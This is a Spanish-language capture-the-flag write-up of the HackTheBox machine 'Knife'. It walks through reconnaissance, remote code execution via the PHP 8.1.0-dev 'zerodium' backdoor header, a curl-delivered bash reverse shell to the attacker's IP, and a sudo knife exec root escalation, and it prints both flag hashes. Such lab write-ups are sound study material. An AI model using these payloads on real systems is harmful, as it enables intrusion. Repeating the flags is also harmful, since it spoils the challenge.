---
title: "Knife_Writeup"
machine: "Knife"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["RCE", "Privesc", "Web"]
retired: true
summary: "HackTheBox - Dificultad: Easy | Linux"
draft: false
---
## Knife

HackTheBox - Dificultad: Easy | Linux

| IP | 10.129 .33 .205 |
| --- | --- |
| os | Ubuntu Linux |
| Dificultad | Easy |
| Vector | PHP 8.1.0-dev Backdoor → sudo knife |

## Índice

## 1. Descripción General

Knife es una máquina Linux de dificultad Easy en HackTheBox. La cadena de ataque es directa pero enseña conceptos críticos: identificación de versiones vulnerables en cabeceras HTTP, explotación de backdoors conocidas en lenguajes interpretados, y abuso de binarios con permisos sudo para escalada de privilegios.

El vector principal es PHP/8.1.0-dev, una versión de desarrollo que en marzo de 2021 tuvo un backdoor introducido maliciosamente en su repositorio oficial. La escalada se consigue mediante sudo knife exec, una herramienta de administración de Chef que permite ejecución arbitraria de código.

## 2. Reconocimiento

## Escaneo Nmap

```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21(RSA)
| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Servicios identificados:

| Puerto | Servicio | Versión | Relevancia |
| --- | --- | --- | --- |
| $22 /$ tcp | SSH | OpenSSH 8.2p1 | Acceso remoto post-explotación |
| $80 /$ tcp | HTTP | Apache 2.4 .41 | Vector principal - PHP backdoor |

## 3. Análisis del Servicio Web

La enumeración con WhatWeb sobre http://Knife.htb revela algo crítico en las cabeceras de respuesta:

```
http://Knife.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ],
HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
IP[10.129.33.205], PHP[8.1.0-dev], Script,
Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

La cabecera X-Powered-By: PHP/8.1.0-dev es la pieza clave. Esta versión de desarrollo fue comprometida en marzo de 2021 cuando un actor malicioso introdujo un backdoor directamente en el repositorio git oficial de PHP. El backdoor se activa mediante una cabecera HTTP específica y permite ejecución remota de comandos sin necesidad de autenticación.

## 4. Explotación - PHP 8.1.0-dev Backdoor (RCE)

## Mecanismo del Backdoor

El backdoor se activa enviando la cabecera User-Agentt (con doble ’ $t$ ’) con el prefijo zerodium seguido del código PHP a ejecutar. El servidor procesa el contenido de la cabecera como código PHP nativo.

## Prueba de Concepto - Verificación de RCE

```
# Verificamos ejecución de comandos con 'id'
curl -H "User-Agentt: zerodium system('id');" http://Knife.htb
# Respuesta del servidor:
uid=1000(james) gid=1000(james) groups=1000(james)
```

El servidor devuelve directamente la salida del comando id, confirmando ejecución de código como el usuario james (uid=1000).

## Obtención de Reverse Shell

Con el RCE confirmado, establecemos una reverse shell para obtener acceso interactivo al sistema:

```
# Terminal 1 - Ponemos escucha en nuestra máquina
nc -lvnp 4444
# Terminal 2 - Enviamos la reverse shell mediante el backdoor
curl -H "User-Agentt: zerodium system('bash -c \"bash -i >& /dev/tcp/10.10.14.54/4444 0>&1\"');" http://k
```

## Conexión recibida:

```
listening on [any] 4444 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.33.205] 46026
bash: cannot set terminal process group (915): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

Acceso inicial conseguido como usuario james.

## 5. Escalada de Privilegios - sudo knife

## Enumeración sudo

El primer paso de mi metodología de escalada siempre es revisar sudo -l. En este caso el vector aparece de inmediato:

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Análisis de la regla sudo:
| Elemento | Valor | Implicación |
| :— | :— | :— |
| (root) | Ejecuta como root | Privilegios uid=0 garantizados |
| NOPASSWD | Sin contraseña | Ejecución directa sin fricción |
| /usr/bin/knife | Chef knife CLI | Permite exec de código Ruby/shell |

## Explotación via GTFOBins

La herramienta knife de Chef incluye el subcomando exec, que permite ejecutar código Ruby arbitrario. Consultando GTFOBins obtenemos el comando exacto para obtener una shell privilegiada:

```
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

```
james@knife:/$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# whoami
root
```

Shell root obtenida. Este caso refuerza la importancia de la metodología: empezar siempre por lo más simple (sudo -I) antes de técnicas avanzadas.

## 6. Flags

```
# User flag
cat /home/james/user.txt
784817ac86d2a69870d25ef38fcda6e7
# Root flag
cat /root/root.txt
7438146c276b7b1497b6db3c5f53e33f
```

## 7. Resumen de la Cadena de Ataque

![image.png](/img/knife/1.png)

## 8. Herramientas Utilizadas

| nmap | Escaneo de puertos y detección de versiones |
| --- | --- |
| WhatWeb | Fingerprinting de tecnologías web (detección PHP/8.1.0-dev) |
| curl | Envío de cabeceras HTTP para trigger del backdoor |
| netcat | Receptor de reverse shell |
| GTFOBins | Referencia para escalada via sudo knife |

Writeup por **4Pr3nd1z** - Mayo 2026
